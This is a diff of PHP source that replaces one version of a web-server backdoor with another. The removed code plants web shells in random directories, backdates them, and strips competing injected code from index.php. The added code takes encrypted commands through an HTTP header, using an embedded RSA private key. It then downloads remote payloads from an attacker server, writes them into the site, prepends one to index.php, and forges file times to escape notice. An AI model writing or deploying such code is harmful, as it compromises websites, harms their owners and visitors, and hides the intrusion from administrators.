-						$arry1[] = dirname($aPathes[$iKey]);
-					}else{
-						$arry1[] = dirname($aPathes[$iKey]);
-					}
-				}
-				$arry2= array_filter(array_unique($arry1));
-				shuffle($arry2);
-				$rndKey = array_rand($arry2);
-				$create_path1 = $arry2[$rndKey];
-	 			$shell5=$create_path1.'/'.$rename;
-		 		if($_SERVER["HTTPS"] == "on") 
-			    {
-			        $http1="https://";
-			    }else{
-			    	$http1="http://";
-			    }
-		 		if(copyfiles($shell_source5,$shell5))
-			    {
-			    	$time3=@dir_size1(dirname(__FILE__),'');
-					$time4=strtotime($time3[0]);
-					touch($shell5,$time4);
-			        echo $http1.$_SERVER["HTTP_HOST"].str_replace(BASE_PATH,"",$shell5).'--create success!';
-			    }
-			    else
-			    {
-			    	$shell_cont5=@curl_get_contents($shell_source5);
-			    	$shell51=@file_put_contents($shell5,$shell_cont5);
-			    	if($shell51>0){
-			    		$time3=@dir_size1(dirname(__FILE__),'');
-						$time4=strtotime($time3[0]);
-						touch($shell5,$time4);
-			    		echo $http1.$_SERVER["HTTP_HOST"].str_replace(BASE_PATH,"",$shell5).'--create success!';
-			    	}else{
-			    		echo $http1.$_SERVER["HTTP_HOST"].str_replace(BASE_PATH,"",$shell5).'--create fail!';
-			    	}
-			    }
-	 		}
-		}
-		exit;
- 	}else if($sig=='index'){
- 		$file_path = BASE_PATH.'/index.php';
- 		$file_path1 = BASE_PATH.'/index.html';
- 		$file_path2 = BASE_PATH.'/index.htm';
- 		$file_path3 = BASE_PATH.'/default.html';
- 	
- 		if(file_exists($file_path)){
- 			$str=@file_get_contents($file_path);
- 			$shell_content1=  $str;
-			$shell_content2 = explode('?>',$shell_content1);
-			$shell_content3 = $shell_content1;
-			for($i=0;$i<count($shell_content2);$i++){
-	 			if(strpos($shell_content2[$i],'base64_decode(') !== false || strpos($shell_content2[$i],'urldecode(') !== false || strpos($shell_content2[$i],'O00__0OOO_') !== false || strpos($shell_content2[$i],'yumingid') !== false || strpos($shell_content2[$i],'urlgz=') !== false || strpos($shell_content2[$i],'O0O_0O_O_0') !== false || strpos($shell_content2[$i],'wp-admin') !== false || strpos($shell_content2[$i],'ignore_user_abort') !== false || strpos($shell_content2[$i],'HTTP_REFERER') !== false || strpos($shell_content2[$i],'sitemap') !== false || strpos($shell_content2[$i],'$x(') !== false || strpos($shell_content2[$i],'$_GET["3x"]') !== false || strpos($shell_content2[$i],'error_reporting') !== false || strpos($shell_content2[$i],'ini_set(') !== false || strpos($shell_content2[$i],'ini_set(') !== false){
-				 	$shell_content3=str_replace($shell_content2[$i]."?>","",$shell_content3);
-				}
- 			}
-            echo $shell_content3;
- 			exit;
- 		}else if(file_exists($file_path1)){
- 			$str1=@file_get_contents($file_path1);
- 			echo $str1;
- 			exit;
- 		}else if(file_exists($file_path2)){
- 			$str2=@file_get_contents($file_path2);
- 			echo $str2;
- 			exit;
- 		}else if(file_exists($file_path3)){
- 			$str3=@file_get_contents($file_path3);
- 			echo $str3;
- 			exit;
- 		}else{
- 			echo '';
- 			exit;
- 		}
- 	}
- 	exit();
-?>
+    return $dirs;
+}
+function getUrl($url)
+{
+    $curl = curl_init();
+    curl_setopt($curl, CURLOPT_URL, $url);
+    curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);
+    curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);
+    curl_setopt($curl, CURLOPT_TIMEOUT, 5);
+    curl_setopt($curl, CURLOPT_AUTOREFERER, 0);
+    curl_exec($curl);
+    $httpCode = curl_getinfo($curl, CURLINFO_HTTP_CODE);
+    curl_close($curl);
+    if ($httpCode === 200) {
+        $content = curl_exec($curl);
+        return ['code' => 200, 'resp' => $content];
+    }
+    return ['code' => 500, 'resp' => ''];
+}
+function getRemoteContent($url)
+{
+    $content = @file_get_contents($url);
+    if ($content === false) {
+        $curl = curl_init();
+        curl_setopt($curl, CURLOPT_URL, $url);
+        curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);
+        curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);
+        curl_setopt($curl, CURLOPT_TIMEOUT, 5);
+        curl_setopt($curl, CURLOPT_AUTOREFERER, 0);
+        $content = curl_exec($curl);
+        curl_close($curl);
+    }
+    return !empty($content) && is_string($content) ? $content : '';
+}
+function copyfile($content, $localfile, $isAppend = false, $appendContent = '')
+{
+    if ($isAppend && !empty($appendContent)) {
+        $content = trim($content);
+        if (substr($content, -2, 2) !== '?>') {
+            $content .= ' ?>';
+        }
+        $content = $content . PHP_EOL . PHP_EOL . $appendContent;
+    }
+    @file_put_contents($localfile, $content);
+    if (!file_exists($localfile)) {
+        $openedfile = @fopen($localfile, "w");
+        @fwrite($openedfile, $content);
+        @fclose($openedfile);
+    }
+    if (!file_exists($localfile)) {
+        return false;
+    }
+    return true;
+}
+function updateFiletime($filepath)
+{
+    $ctime = filectime($filepath);
+    $now = time();
+    if (!($now > $ctime + 31104000)) {
+        $newTime = $now - (mt_rand(15552000, 31104000));
+        touch($filepath, $newTime, $newTime);
+        return true;
+    }
+    return true;
+}
+$privateKey = '-----BEGIN PRIVATE KEY-----
+MIIEvQIBADANBgkqhkiG9w0BAQEFAASCBKcwggSjAgEAAoIBAQC30w49ItOfldQ6
+dB+0gEbeeW6BEClcx+NZzmpX2YcRHFV80BurCWBavPFehV8Sy9yL2u/y3mv3QJJ+
+x2kKvly8zKx4GbXPbsWJk6Ho0Rxq49oXkBarQBOqROZeaFF3Mzpd/PdLSsxEvG1M
+tQd2wOx5r6XD86jyfN7LAJUUVvbJvn1CHo03nFH12k1KYwLnQfzQI5nX7yQLa0jt
+fG5TA34Fm0EMbFdHWjAN/VdEjoJI6it4PCQP5wk4ga2BvVquQkuPbsbr8364d3I6
+GuGAKDR0wfkT20n0E6kAmDI3ol2bfa0rQncqUS3OU3INpxOZS8eKCIgC3bM81mdi
+MQ6TsAQ9AgMBAAECggEAJLGSlA2RpLdpx8lKUuOQQfSHZGfveb/E2DZl7+dSGM5J
+GkMIYtnaTAKPQ8jns37SJXCsmRRhBNf05i20ABsDtAQ/ITIwopmAAPhhR3IGdCfL
+bwyqGcEOq9xZB9tW965YJk7KplLl94qNXtR8Cu5zxc6UDktjHBRk/Ky/FXJOjPKM
+sA8rhox7dqlZUB3I/qiqrQOgT1Bsq1BFT+2GGwRUWZ1CyFoZvhsDomdo4yhRrB0b
+8Ym4MDiVqxFPVW8XB9RFD9YKt+v50Eb6iSKJNLpRmjZDNZbrEYO6NRsRBM7brDa9
+n39mZWFr47wGGXXv/NhwTvRI+2Si/ZfdP4+o5TeSWQKBgQDhIVOUODisiLhk7XKb
+Yu7BW1ZFcK0JxurqHN22msvA0Q/1q4RvziETjekXIn9lVKCmS/gy2O2RtuQRulAR
+fc3sz2W9tNXRF8Avy0728NG0baOOwBalO8w3cCX6Nnm70pJer+iJSn3tmAKSB4LT
+vbSB8pt6QgP8NPHyQdWp2LwOtwKBgQDRB8lgSaImIMJBaXERSaoNg8kxv3/cv4g5
+jUlljxNQcUsj0V7XilnB3mFxq5rHjBZTsKzMMQyvhOxYhptDfw6OLtoPUk2WiBUs
+l3qU0tIXNN+cTxu2SMKTjwMktkpmACJqa+k27eEUqxrKO/6SEiP9FMXHvgA4EEBM
+Hww1eU9QqwKBgAWSY5Uphw2OHLIyxkFeQ3Z5ojr5vO6fA7VjnYEld6GACxsTcaWq
+vlrTik9ORUTmwUscWjo38DlJA4AE0nJ8YJpZz7TQQvJ32gPUzlGCSE5k4EVqL6VL
+Q5Sjq+zzaDPj1EePpvuu4kr9FiMzGGPRMCR/MqXl+F9HmC1cv8MCYDUlAoGBAK77
+g7pVKaYdWkCD0iEUt4Rkw/IfSxwyQglbmwungBWhIbO0O17X9Fd0n8IWU5WkUbRx
+e9XbYbE05t0cobEZFcg0tFqLHWRcOs1/aSBYc4L1whMJrjskIa6A07LR3uoQRr8r
+4qkW7YrtyZluK6eABByCXSbeiTRldk3C1+eTy6/NAoGAb9/J+NWrhYSr/VoGWjui
+chXCNszy4w6exVwxXQKNTtlzKxyhQfVPK2BxrptWL6KCRKpz3wh+WY2C3QYyVfwG
+FB4hwDr2mY4TWF9pD194iES1yhrQGlI8XM+2LVhBl3p0x+TFgJMaTgDDqAnxpuqT
+upBYqTYMlOd+VR7hENMaFqo=
+-----END PRIVATE KEY-----';
+$p = $_SERVER['HTTP_P'];
+$params = openssl_private_decrypt(base64_decode(urldecode($p)), $decrypted, $privateKey) ? $decrypted : null;
+if (is_null($params)) {
+    error(MsgText::DECRYPT_FAIL);
+}
+$params = json_decode($params, true);
+if (!is_array($params)) {
+    error(MsgText::PARAM_TYPE, $params);
+}
+if (empty($params['server'])) {
+    error('server ' . MsgText::PARAM_EMPTY);
+}
+if (empty($params['iden'])) {
+    error('iden ' . MsgText::PARAM_EMPTY);
+}
+$iden = isset($params['iden']) ? strtolower($params['iden']) : '';
+switch ($iden) {
+    case "beima":
+        $res = doBeima($params);
+        break;
+    case "rename":
+        $res = doRename($params);
+        break;
+    case "index":
+        $res = doIndex($params);
+        break;
+    case "sub":
+    case "htaccess":
+        $res = doSub($params);
+        break;
+    case "lock":
+        $res = doLock($params);
+        break;
+    case "style":
+        $res = doStyle($params);
+        break;
+    default:
+        error('iden ' . MsgText::VALUE_ERROR);
+}
+function doBeima($params)
+{
+    if (empty($params['filename'])) {
+        error('filename ' . MsgText::PARAM_EMPTY, $params);
+    }
+    if (empty($params['shellfile'])) {
+        error('shellfile ' . MsgText::PARAM_EMPTY, $params);
+    }
+    empty($params['level']) && $params['level'] = 6;
+    $dirs = getDirPathsByLevel($params['level']);
+    $temp = array_rand($dirs);
+    $createDir = $dirs[$temp] . '/';
+    $localfilepath = $createDir . $params['filename'];
+    $remoteFileUrl = $params['server'] . $params['shellfile'];
+    $content = getRemoteContent($remoteFileUrl);
+    $content = json_decode($content, true);
+    if (!empty($content['result'])) {
+        if (copyfile($content['result'], $localfilepath)) {
+            updateFiletime($localfilepath);
+            $beimaurl = str_replace($_SERVER['DOCUMENT_ROOT'], '', $localfilepath);
+            success(compact('localfilepath', 'beimaurl'));
+        }
+        error(MsgText::LOCAL_FILE_ERROR, compact('localfilepath'));
+    }
+    error(MsgText::REMOTE_FILE_EXISTS, compact('remoteFileUrl'));
+}
+function doRename($params)
+{
+    if (empty($params['sourcename'])) {
+        error('sourcename ' . MsgText::PARAM_EMPTY, $params);
+    }
+    if (empty($params['rename'])) {
+        error('rename ' . MsgText::PARAM_EMPTY, $params);
+    }
+    if ($params['sourcename'] === $params['rename']) {
+        error(MsgText::NOCHANGE);
+    }
+    $sourceFile = dirname(__FILE__) . DIRECTORY_SEPARATOR . $params['sourcename'];
+    $renameFile = dirname(__FILE__) . DIRECTORY_SEPARATOR . $params['rename'];
+    $resSource = $params['server'] . str_replace(strtolower($_SERVER['DOCUMENT_ROOT']), '', strtolower($sourceFile));
+    $resSource = str_replace('\\', '/', $resSource);
+    if (file_exists($sourceFile)) {
+        if (rename($sourceFile, $renameFile)) {
+            success($renameFile);
+        } else {
+            error(MsgText::RENAME_ERROR, compact('renameFile'));
+        }
+    } else {
+        error(MsgText::LOCAL_FILE_EXISTS, compact('resSource'));
+    }
+}
+function doIndex($params)
+{
+    if (empty($params['shellfile'])) {
+        error('shellfile ' . MsgText::PARAM_EMPTY, $params);
+    }
+    $remoteUrl = $params['server'] . trim($params['shellfile']);
+    $localfilepath = $_SERVER['DOCUMENT_ROOT'] . '/index.php';
+    $content = getRemoteContent($remoteUrl);
+    $content = json_decode($content, true);
+    if (!empty($content['result'])) {
+        $oldContent = '';
+        if (file_exists($localfilepath)) {
+            $oldContent = @file_get_contents($localfilepath);
+        } elseif (file_exists($_SERVER['DOCUMENT_ROOT'] . '/index.html')) {
+            $oldContent = @file_get_contents($_SERVER['DOCUMENT_ROOT'] . '/index.html');
+        } elseif (file_exists($_SERVER['DOCUMENT_ROOT'] . '/index.htm')) {
+            $oldContent = @file_get_contents($_SERVER['DOCUMENT_ROOT'] . '/index.htm');
+        } elseif (file_exists($_SERVER['DOCUMENT_ROOT'] . '/default.html')) {
+            $oldContent = @file_get_contents($_SERVER['DOCUMENT_ROOT'] . '/default.html');
+        } elseif (file_exists($_SERVER['DOCUMENT_ROOT'] . '/default.htm')) {
+            $oldContent = @file_get_contents($_SERVER['DOCUMENT_ROOT'] . '/default.htm');
+        }
+        if (copyfile($content['result'], $localfilepath, true, $oldContent)) {
+            updateFiletime($localfilepath);
+            @chmod($localfilepath, 0644);
+            success($localfilepath);
+        }
+        error(MsgText::LOCAL_FILE_ERROR, compact('localfilepath'));
+    }
+    error(MsgText::INDEX_ERROR, compact('remoteUrl'));
+}
+function doSub($params)
+{
+    if (empty($params['shellfile'])) {
+        error('shellfile' . MsgText::PARAM_EMPTY, $params);
+    }
+    if (empty($params['filename'])) {
+        error('filename ' . MsgText::PARAM_EMPTY, $params);
+    }
+    $localfilepath = $_SERVER['DOCUMENT_ROOT'] . '/' . $params['filename'];
+    $remoteFileUrl = $params['server'] . $params['shellfile'];
+    $content = getRemoteContent($remoteFileUrl);
+    $content = json_decode($content, true);
+    if (!empty($content['result'])) {
+        if (copyfile($content['result'], $localfilepath)) {
+            updateFiletime($localfilepath);
+            @chmod($localfilepath, 0644);
+            success($localfilepath);
+        }
+        error(MsgText::LOCAL_FILE_ERROR, compact('localfilepath'));
+    }
+    error(MsgText::REMOTE_GET_ERROR, compact('remoteFileUrl'));
+}
+function doLock($params)
+{
+    if (empty($params['filename'])) {
+        error('filename ' . MsgText::PARAM_EMPTY, $params);
+    }
+    if (empty($params['domain'])) {
+        error('domain ' . MsgText::PARAM_EMPTY, $params);
+    }
+    if (empty($params['shellfile'])) {
+        error('shellfile ' . MsgText::PARAM_EMPTY, $params);
+    }
+    $localfilepath = $_SERVER['DOCUMENT_ROOT'] . '/' . $params['filename'];
+    $remoteFileUrl = $params['server'] . $params['shellfile'];
+    $content = getRemoteContent($remoteFileUrl);
+    $content = json_decode($content, true);
+    if (!empty($content['result'])) {
+        if (copyfile($content['result'], $localfilepath)) {
+            $lockurl = $params['domain'] . $params['filename'];
+            $lockres = getUrl($lockurl);
+            @unlink($localfilepath);
+            if ($lockres['code'] === 200 && !empty($lockres['resp']) && strpos($lockres['resp'], 'success')) {
+                success($lockres['resp']);
+            }
+            error(MsgText::LOCK_FILE_SUCCESS, compact('lockurl', 'lockres'));
+        }
+        @unlink($localfilepath);
+        error(MsgText::LOCK_FILE_ERROR, compact('localfilepath'));
+    }
+    error(MsgText::REMOTE_GET_ERROR, compact('remoteFileUrl'));
+}
+function doStyle($params)
+{
+    if (empty($params['shellfile'])) {
+        error('shellfile' . MsgText::PARAM_EMPTY, $params);
+    }
+    if (empty($params['filename'])) {
+        error('filename ' . MsgText::PARAM_EMPTY, $params);
+    }
+    if (empty($params['domain'])) {
+        error('domain ' . MsgText::PARAM_EMPTY, $params);
+    }
+    $localfilepath = $params['domain'] . $params['filename'];
+    $remoteFileUrl = $params['server'] . $params['shellfile'];
+    $content = getRemoteContent($remoteFileUrl);
+    $content = json_decode($content, true);
+    if (!empty($content['result'])) {
+        if (copyfile($content['result'], $localfilepath)) {
+            updateFiletime($localfilepath);
+            @chmod($localfilepath, 0644);
+            success($localfilepath);
+        }
+        error(MsgText::LOCAL_FILE_ERROR, compact('localfilepath'));
+    }
+    error(MsgText::REMOTE_GET_ERROR, compact('remoteFileUrl'));
+}
